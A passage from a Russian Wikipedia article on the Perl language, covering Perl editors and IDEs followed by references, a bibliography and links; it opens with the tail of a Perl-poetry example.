next
decade
;
sleep
,
sleep
,
die
yourself
,
die
at
last
Редакторы
[
править
|
править код
]
Специально для Perl-разработчиков на языке Perl с использованием интерфейсной библиотеки
wxWidgets
написан такой открытый продукт как
Padre IDE
(
англ.
)
(сокращение от «Perl Application Development and Refactoring Environment»&#160;— среда разработки и
рефакторинга
перл-приложений)
&#91;41&#93;
.
Поддержка Perl включена в такую универсальную
IDE
, как
ActiveState Komodo
и её открытую версию Komodo Edit
&#91;42&#93;
. Для
Eclipse
поддержка Perl реализована в виде пакет расширений EPIC
&#91;41&#93;
&#91;43&#93;
. Обе этих среды в числе прочего включают визуальный
отладчик
&#91;44&#93;
.
IntelliJ IDEA
и прочие продукты
JetBrains
поддерживают Perl5 с помощью плагина с открытым исходным кодом&#160;—
Camelcade
.
Поддержка перла в том или ином виде имеется в большинстве текстовых редакторов для программистов, таких как
кроссплатформенные
Vim
&#91;41&#93;
,
Emacs
&#91;41&#93;
,
SciTE
&#91;41&#93;
,
Gedit
&#91;45&#93;
,
Geany
,
jEdit
&#91;45&#93;
,
Sublime Text
, или предназначенные для
Windows
Notepad++
&#91;41&#93;
&#91;45&#93;
и
PSPad
а также такие
shareware
продукты как
UltraEdit
&amp; UEStudio от IDM Computer Solutions, Inc. Для
Mac OS
таким редактором может служить
TextMate
&#91;41&#93;
.
Определённой популярностью среди пользователей Windows пользуется также Perl Editor, входящий в линейку специализированных shareware редакторов для программистов от DzSoft
&#91;46&#93;
&#91;47&#93;
&#91;48&#93;
. Был достаточно известен бесплатный редактор Mastak Absolute Perl
&#91;49&#93;
, но его разработка и поддержка прекращены, последняя версия датируется 29 сентября 2003 года
&#91;50&#93;
. Ещё один отечественный бесплатный perl-редактор для Windows&#160;— это Perl Express
&#91;51&#93;
(последняя версия с русским интерфейсом&#160;— 2.4.5 от 2 декабря 2005, с английским&#160;— 2.5 от 23 декабря 2005)
&#91;52&#93;
. Среди других сред разработки, специализированных для Perl следует отметить shareware IDE PerlBuilder
&#91;53&#93;
&#91;54&#93;
&#91;55&#93;
и отечественный редактор Collie Perl Shell 2.0
&#91;54&#93;
&#91;56&#93;
.
См. также
[
править
|
править код
]
Python
PHP
Примечания
[
править
|
править код
]
↑
1
2
3
http://learn.perl.org/faq/perlfaq1.html
↑
1
2
http://www.perlfoundation.org/
↑
Perl 5.28.0 is now available!
&#160;
(неопр.)
.&#32; www.nntp.perl.org.
↑
1
2
3
4
5
6
https://www.perl.org/get.html
↑
1
2
Perl documentation
&#160;
(англ.)
.&#32;
Проверено 18 декабря 2016.
↑
What's the difference between "perl" and "Perl"?
&#160;
(англ.)
.&#32;
Проверено 18 декабря 2016.
↑
perlintro(1)
man page
↑
Usenet post, May 10, 1997, with ID 199705101952.MAA00756@wall.org
↑
Larry Wall
&#160;
(неопр.)
&#160;
(недоступная ссылка)
.&#32;
Проверено 20 августа 2006.
&#32;
Архивировано
12&#160;марта 2006&#160;года.
↑
Perl, a «replacement» for
awk
and
sed
&#160;
(неопр.)
.&#32;
Проверено 18 декабря 2007.
↑
Архив списка рассылки perl5-porters
↑
История языка Perl на сайте perldoc.perl.org &#160;
(англ.)
↑
perl.org CPAN page
&#160;
(неопр.)
.&#32;
Архивировано
27&#160;мая 2012&#160;года.
↑
perl56delta&#160;— perldoc.perl.org
↑
perl561delta&#160;— perldoc.perl.org
↑
Apocalypse&#160;1: The Ugly, the Bad, and the Good&#160;— dev.perl.org
&#160;
(англ.)
↑
perl58delta&#160;— perldoc.perl.org
↑
HaskellWiki
↑
perldelta: what is new for perl 5.10.0
Архивировано
30&#160;марта 2009&#160;года.
↑
Smart matching in detail
Архивировано
18&#160;февраля 2010&#160;года.
↑
perl5120delta&#160;— search.cpan.org
↑
perl5122delta&#160;— search.cpan.org
↑
perldelta - what is new for perl v5.12.3
&#160;
(англ.)
.&#32;
Perl 5 version 12.2 documentation
.&#32; perldoc.perl.org.&#32;
Проверено 18 декабря 2013.
↑
1
2
perldelta - what is new for perl v5.16.0
&#160;
(англ.)
.&#32;
Perl 5 version 16.0 documentation
.&#32; metacpan.org.&#32;
Проверено 21 мая 2012.
↑
perl5180delta - what is new for perl v5.18.0 - metacpan.org - Perl programming language
&#160;
(неопр.)
.&#32;
Perl 5 version 18.0 documentation
.&#32; metacpan.org.&#32;
Проверено 27 октября 2013.
↑
Perl 5.20 released
&#160;
(англ.)
&#32;(27&#160;May 2014).&#32;
Проверено 18 декабря 2016.
↑
Perl 5.22 a preview
&#160;
(англ.)
&#32;(16&#160;April 2015).&#32;
Проверено 18 декабря 2016.
↑
.
Perl 5.24 released
&#160;
(англ.)
&#32;(9&#160;May 2016).&#32;
Проверено 18 декабря 2016.
↑
Perl 5.26 released
&#160;
(англ.)
&#32;(30&#160;May 2017).
↑
Milestones in the Perl Renaissance&#160;— Modern Perl Programming
. Modernperlbooks.com. Retrieved on 2013-07-17.
↑
Вячеслав Тихановский.
&#32;
Возрождение Perl
&#160;// Pragmatic Perl.&#160;— Март 2013.&#160;—
Вып. 1
.
↑
Preface (Modern Perl 2011—2012)
. Modernperlbooks.com. Retrieved on 2013-07-17.
↑
YAPC::NA 2013&#160;— June 3-5, Austin, Texas
↑
What is Moe (a clarification) | Stevan Little [blogs.perl.org&#93;
↑
p2 on potion
↑
goccy/gperl · GitHub
↑
Tom Christiansen, Larry Wall, Brian Foy and Jon Orwant.
&#32;
Ch. 12. Objects. -&gt; The Moose in the Room
&#32;&#47;&#47;&#32;Programming Perl: Unmatched Power for Text Processing and Scripting.&#160;—
O’Reilly
, 2012.&#160;— P.&#160;453-455.&#160;— 1130&#160;p.&#160;—
ISBN 0596004923
, 9780596004927.
↑
moose&#160;— A Postmodern Object System for Perl
↑
программа из одной строчки на Perl
↑
perlfaq3&#160;— perldoc.perl.org
↑
1
2
3
4
5
6
7
Sébastien Aperghis-Tramoni, Damien Krotkine, Philippe Bruhat, Jérôme Quelin.
&#32;
Ch.1 Démarrer avec Perl ⟶ Édites les programmers
&#32;&#47;&#47;&#32;Perl moderne.&#160;— Pearson Education France, 29 окт. 2010 г..&#160;— С.&#160;4-5.&#160;— 446&#160;p.&#160;— (Le Guide de survie).&#160;—
ISBN 9782744024191
.
↑
Andy Lester, Richard Foley.
&#32;
Ch. 14. Command LineDebuggers and GUI Debuggers ⟶ ActivePerl Pro Studio
&#32;&#47;&#47;&#32;Pro Perl Debugging.&#160;— Apress, 27 июля 2005 г.&#160;— С.&#160;233.&#160;— 296&#160;p.&#160;—
ISBN 9781430200444
.
↑
EPIC&#160;— Perl Editor and IDE for Eclipse
↑
brian d foy.
&#32;
Ch 4. Debugging Perl ⟶ Other Debuggers
&#32;&#47;&#47;&#32;Mastering Perl.&#160;— O’Reilly, 16 июля 2007 г.&#160;— P.&#160;64.&#160;— 346&#160;p.&#160;—
ISBN 9780596551476
.
↑
1
2
3
Keith Bradnam, Ian Korf.
&#32;
2.3 Installing a code editor
&#32;&#47;&#47;&#32;UNIX and Perl to the Rescue!: A Field Guide for the Life Sciences (and Other Data-rich Pursuits).&#160;— Cambridge University Press,, 19 июля 2012 г.&#160;— P.&#160;15.&#160;— 428&#160;p.&#160;—
ISBN 9781107000681
.
↑
R. Chris Fraley.
&#32;
Ch. 15. Wrapping it Up
&#32;&#47;&#47;&#32;How to Conduct Behavioral Research Over the Internet: A Beginner's Guide to HTML and CGI/Perl.&#160;— Guilford Press, 2004.&#160;— P.&#160;272.&#160;— 299&#160;p.&#160;—
ISBN 978-1-57230-997-5
.
↑
John P. Flynt.
&#32;
Ch 1. Getting Started
&#32;&#47;&#47;&#32;Perl Power!: The Comprehensive Guide.&#160;— Thomson Course Technology PTR, 2006.&#160;— С.&#160;22-24.&#160;— 427&#160;p.&#160;—
ISBN 9781598631616
.
↑
DzSoft Perl Editor
↑
«Мастак.Ру» представил комплексный инструментарий для Perl-разработчиков
,
CNews
&#160;(24.04.02).&#32;
Проверено 9 января 2014.
↑
Mastak Absolute Perl
на SoftPortal
↑
Perl
в каталоге ссылок Open Directory Project (
dmoz
).
↑
Perl Express
&#160;— бесплатный Perl-редактор для Windows
↑
Andy Lester, Richard Foley.
&#32;
Ch. 14. Command LineDebuggers and GUI Debuggers ⟶ Perl Builder
&#32;&#47;&#47;&#32;Pro Perl Debugging.&#160;— Apress, 27 июля 2005 г.&#160;— С.&#160;234-235.&#160;— 296&#160;p.&#160;—
ISBN 9781430200444
.
↑
1
2
p4in.
&#32;
Софт для perl-разработчика
&#160;// Спецвыпуск Xakep.&#160;—
№ 15
.
↑
Perl Builder 2.0
Архивировано
13&#160;февраля 2014&#160;года.
↑
Collie Perl Shell 2.0
Архивировано
9&#160;января 2014&#160;года.
Литература
[
править
|
править код
]
Ларри Уолл, Том Кристиансен, Джон Орвант.
&#32;
Программирование на Perl
&#32;&#61;&#32;Programming Perl.&#160;—
М.
:
O’Reilly
,
«Символ»
, 2008.&#160;— 1145&#160;с.&#160;—
4500 экз.
&#160;—
ISBN 5-93286-020-0
.
Рэндал Л. Шварц, Том Феникс, Брайан Д. Фой.
&#32;
Изучаем Perl
.&#160;—
М.
:
O’Reilly
,
«Символ»
, 2009.&#160;— С.&#160;377.&#160;—
ISBN 978-5-93286-154-7
.
Рэндал Л. Шварц, Брайан Д. Фой и Том Феникс.
&#32;Perl: изучаем глубже.&#160;—
М.
:
O’Reilly
,
«Символ»
, 2007.&#160;— С.&#160;320.&#160;—
ISBN 978-5-93286-093-9
.
Кристиансен, Торкингтон.
&#32;
Perl. Сборник рецептов. Для профессионалов
&#32;&#61;&#32;Perl Cookbook.&#160;—
М.
:
O’Reilly
,
«Питер»
, 2004.&#160;— 928&#160;с.&#160;—
ISBN 5-94723-855-1
.
Пол Уайтхэд.
&#32;Perl: наглядный курс программирования&#32;&#61;&#32;Perl: Your Visual Blueprint for Building Perl Scripts.&#160;—
М.
:
«Диалектика»
, 2001.&#160;— 280&#160;с.&#160;—
ISBN 0-7645-3478-5
.
Линкольн Д. Штайн.
&#32;
Разработка сетевых программ на Perl
&#32;&#61;&#32;Network Programming with Perl.&#160;—
М.
:
Addison Wesley
,
«Вильямс»
, 2001.&#160;— 752&#160;с.&#160;—
4000 экз.
&#160;—
ISBN 5-8459-0222-3
.
Learning Perl
6th Edition (2011), O'Reilly. Beginner-level introduction to Perl.
Beginning Perl
1st Edition (2012), Wrox. A beginner's tutorial for those new to programming or just new to Perl.
Modern Perl
2nd Edition (2012), Onyx Neon. Describes
Modern Perl
programming techniques.
Programming Perl
4th Edition (2012), O'Reilly. The definitive Perl reference.
Effective Perl Programming
2nd Edition (2010), Addison-Wesley. Intermediate- to advanced-level guide to writing idiomatic Perl.
Perl Cookbook
,
ISBN&#160;
0-596-00313-7
. Practical Perl programming examples.
Dominus, Mark Jason.
&#32;
Higher Order Perl
.&#160;— Morgan Kaufmann, 2005.&#160;—
ISBN 1-55860-701-3
.
Functional programming techniques in Perl.
Ссылки
[
править
|
править код
]
Perl
в Викиучебнике
Perl
на Викискладе
Официальный сайт
&#160;
(англ.)
www.cpan.org Fрхив библиотек для языка Perl
—
CPAN
&#160;
(англ.)
Perldoc
— официальная документация Perl&#160;
(англ.)
Pragmatic Perl
— электронный журнал о современном Perl на русском
Perl
в каталоге ссылок
Open Directory Project
(dmoz)
Perl
Люди
Ларри Уолл
Рэндел Шварц
Дэмиэн Конуэй
Эллисон Рэндел
Audrey Tang
Simon Cozens
chromatic
Адам Кеннеди
brian d foy
Mark Jason Dominus
Things
The Perl Foundation
Perl Mongers
PerlMonks
архивы
модули
Perl VM
Parrot
YAPC
Bioperl
Plack
PSGI
Фреймворки
Catalyst
Mason
Maypole
Dancer
Moose
Mojolicious
Outline
Категория
Свободное и открытое программное обеспечение
Главное
Копилефт
СПО
Определение
Критерии Debian
Сообщество
Движение
Gratis versus libre
Сравнение хостингов СПО
Открытое ПО
Определение
Определение свободных произведений культуры
Список FOSS-пакетов
Дистрибутив Linux
История
GNU
Linux
Конфликт SCO — Linux
Mozilla
Application Suite
Firefox
Thunderbird
Организации
ASF
AOSP
Blender Foundation
Eclipse Foundation
FreeBSD Foundation
freedesktop.org
FSF
FSMI
GNOME Foundation
Проект GNU
Google Code
KDE e.V.
Linux Foundation
Mozilla Foundation
OSGF
OSI
ReactOS Foundation
Software Freedom Conservancy
SourceForge
Symbian Foundation
The Document Foundation
Xiph.Org
XMPP Standards Foundation
X.Org Foundation
Лицензии
Apache
Artistic
Beerware
BSD
GNU GPL
GNU LGPL
ISC
MIT
MPL
Ms-PL/RL
zlib
Public domain
/
CC0
WTFPL
Лицензии, одобренные FSF
Разрешительные лицензии
Проблемы
Разнообразие лицензий
Безопасность
(
англ.
)
Блоб
Программные патенты
DRM
Тивоизация
Trusted Computing
Графическое оборудование и СПО
Прочее
Сообщество
Форк
Microsoft Open Specification Promise
Сравнение open source и закрытых исходников
Проприетарное ПО
Собор и Базар
Ради удовольствия
Revolution OS
Книга
Категория
Викисклад
Портал
Источник —
https://ru.wikipedia.org/w/index.php?title=Perl&amp;oldid=97957819
Категории
:
Языки программирования по алфавиту
Языки программирования, появившиеся в 1987 году
Perl
Свободные компиляторы и интерпретаторы
Скрытые категории:
Википедия:Статьи с некорректным использованием шаблонов:Cite web (не указан язык)
Страницы, использующие волшебные ссылки ISBN
Википедия:Статьи с переопределением значения из Викиданных
Википедия:Статьи с источниками из Викиданных
Википедия:Страницы с ежедневно очищаемым кэшем
ПРО:ИТ:Статьи по алфавиту
ПРО:ИТ:Последняя правка: в текущем месяце
Википедия:Статьи для обновления
Статьи со ссылками на Викиучебник
Навигация
Персональные инструменты
Вы не представились системе
Обсуждение
Вклад
Создать учётную запись
Войти
Пространства имён
Статья
Обсуждение
Варианты
Просмотры
Читать
Текущая версия
Править
Править код
История
Ещё
Поиск
Навигация
Заглавная страница
Рубрикация
Указатель А — Я
Избранные статьи
Случайная статья
Текущие события
Участие
Сообщить об ошибке
Сообщество
Форум
Свежие правки
Новые страницы
Справка
Пожертвовать
Инструменты
Ссылки сюда
Связанные правки
Служебные страницы
Постоянная ссылка
Сведения о странице
Элемент Викиданных
Цитировать страницу
Печать/экспорт
Создать книгу
Скачать как PDF
Версия для печати
В других проектах
Викисклад
Викиучебник
На других языках
Alemannisch
Aragonés
العربية
Asturianu
Azərbaycanca
Žemaitėška
Беларуская
Български
বাংলা
Català
کوردی
Čeština
Cymraeg
Dansk
Deutsch
Ελληνικά
English
Esperanto
Español
Eesti
Euskara
فارسی
Suomi
Français
Gaeilge
Galego
ગુજરાતી
עברית
हिन्दी
Hrvatski
Magyar
Հայերեն
Bahasa Indonesia
Italiano
日本語
ქართული
Қазақша
ಕನ್ನಡ
한국어
Kurdî
Кыргызча
Latina
Lëtzebuergesch
Lumbaart
Lietuvių
Latviešu
Македонски
മലയാളം
मराठी
Bahasa Melayu
မြန်မာဘာသာ
नेपाल भाषा
Nederlands
Norsk nynorsk
Norsk
ଓଡ଼ିଆ
Deitsch
Polski
Português
Română
Саха тыла
Scots
Srpskohrvatski / српскохрватски
Simple English
Slovenčina
Slovenščina
Shqip
Српски / srpski
Svenska
தமிழ்
Тоҷикӣ
ไทย
Türkçe
Українська
اردو
Tiếng Việt
吴语
中文
Bân-lâm-gú
粵語
Править ссылки
Эта страница в последний раз была отредактирована 6 февраля 2019 в 23:00.
Текст доступен по
лицензии Creative Commons Attribution-ShareAlike
; в отдельных случаях могут действовать дополнительные условия.
Подробнее см.
Условия использования
.
Wikipedia® — зарегистрированный товарный знак некоммерческой организации
Wikimedia Foundation, Inc.
Политика конфиденциальности
Описание Википедии
Отказ от ответственности
Свяжитесь с нами
Разработчики
Соглашение о cookie
Мобильная версия
